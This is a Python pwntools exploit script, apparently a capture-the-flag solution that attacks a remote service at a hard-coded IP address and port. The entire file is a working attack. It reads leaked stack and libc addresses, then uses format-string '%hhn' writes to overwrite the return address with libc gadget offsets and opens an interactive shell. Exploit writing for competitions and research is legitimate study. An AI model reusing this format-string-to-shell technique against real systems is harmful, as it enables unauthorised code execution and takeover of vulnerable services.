#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
exe = ELF("./challenge-3_patched_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("34.70.212.151", 8003)

    return r


def main():

    p = remote('34.70.212.151', 8003)
    #p = process([exe.path])
    #%hhn

    p.recvuntil(b'>> ')
    p.sendline(b'1')
    leaks= p.recvline().strip().split(b' ')
    fgets = int(leaks[1],16)
    stack = int(leaks[0],16)

    stack += 0x20 +0x10 + 0x8

    #17 main retaddr

    def print_addr(addr,payload):
        for i in range(6):
            p.recvuntil(b'>> ')
            p.sendline(b'2')
            p.recvuntil(b'>> ')
            frmt = f'%{payload[i]}c%8$hhn'.ljust(16,' ').encode() + p64(addr+i)
            p.sendline(frmt)

    def print_0(addr):
        p.recvuntil(b'>> ')
        p.sendline(b'2')
        p.recvuntil(b'>> ')
        frmt = f'%8$n'.ljust(16,' ').encode() + p64(addr)
        p.sendline(frmt)
    #%{val}c%{offset}$hhn    addr+i 
    #1ba736

    libc.address = fgets - libc.sym['fgets']
    print_addr(stack-8,p64(stack+0x60))
    print_addr(stack,p64(libc.address + 0x1ba736 ))
    print_0(stack+8)
    print_addr(stack+16,p64(libc.address + 0xebc88 ))
    #p.sendlineafter(b'>> ',b'3')

    p.interactive()




if __name__ == "__main__":
    main()
